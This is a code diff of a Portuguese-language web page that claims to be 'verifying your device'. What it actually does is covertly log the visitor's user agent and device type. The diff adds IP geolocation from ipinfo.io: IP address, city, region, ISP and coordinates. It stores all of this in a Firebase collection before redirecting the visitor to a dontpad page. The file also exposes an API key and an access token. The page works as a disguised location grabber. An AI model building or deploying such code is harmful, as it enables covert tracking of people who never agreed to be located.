@@ -42,16 +42,15 @@
 </head>
 <body>
   <div class="container">
-    <h2>Verificando seu dispositivo...</h2>
+    <h2 id="status">Verificando seu dispositivo...</h2>
   </div>
-
 
   <!-- Firebase SDK compat -->
   <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
 
   <script>
-    // Configuração do Firebase
+    // Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyCMFKWtiztDvD5BsplbCtPSMnqX0GRt8_A",
       authDomain: "rastreio-104af.firebaseapp.com",
@@ -61,30 +60,25 @@
       appId: "1:992405931160:web:e673a6fd95ff0673973ced"
     };
 
-    // Inicializa Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
     function detectarDispositivo() {
       const userAgent = navigator.userAgent;
-      let modelo = "Desconhecido";
-
       if (userAgent.includes("iPhone")) {
-        if (userAgent.includes("iPhone XR")) modelo = "iPhone XR";
-        else modelo = "iPhone";
+        if (userAgent.includes("iPhone XR")) return "iPhone XR";
+        return "iPhone";
       } else if (userAgent.includes("Android")) {
-        modelo = "Android";
+        return "Android";
       } else if (userAgent.includes("Windows")) {
-        modelo = "Windows";
+        return "Windows";
       } else if (userAgent.includes("Macintosh")) {
-        modelo = "Mac";
+        return "Mac";
       }
-
-      return modelo;
+      return "Desconhecido";
     }
 
-    // Dados do acesso
-    const log = {
+    const logBasico = {
       timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent,
       dispositivo: detectarDispositivo(),
@@ -96,18 +90,31 @@
       }
     };
 
-    // Salva no Firestore
-    db.collection("acessos").add(log)
-      .then(() => {
-        setTimeout(() => {
-          document.body.innerHTML = "<h2>Redirecionando...</h2>";
-          window.location.href = "https://dontpad.com/0412igotit";
-        }, 3000);
+    // Obtém localização pelo IP com ipinfo.io
+    fetch('https://ipinfo.io/json?token=778d905b6237de') // ← insira seu token aqui
+      .then(response => response.json())
+      .then(data => {
+        const localizacao = {
+          ip: data.ip,
+          cidade: data.city,
+          estado: data.region,
+          pais: data.country,
+          operadora: data.org,
+          coordenadas: data.loc // "latitude,longitude"
+        };
+
+        const logFinal = { ...logBasico, localizacao };
+
+        db.collection("acessos").add(logFinal)
+          .catch(console.error);
       })
-      .catch((error) => {
-        console.error("Erro ao salvar no Firestore:", error);
-        // mesmo com erro, redireciona
+      .catch(error => {
+        console.error("Erro ao buscar IP info:", error);
+        db.collection("acessos").add(logBasico);
+      })
+      .finally(() => {
         setTimeout(() => {
+          document.getElementById("status").innerText = "Redirecionando...";
           window.location.href = "https://dontpad.com/0412igotit";
         }, 3000);
       });
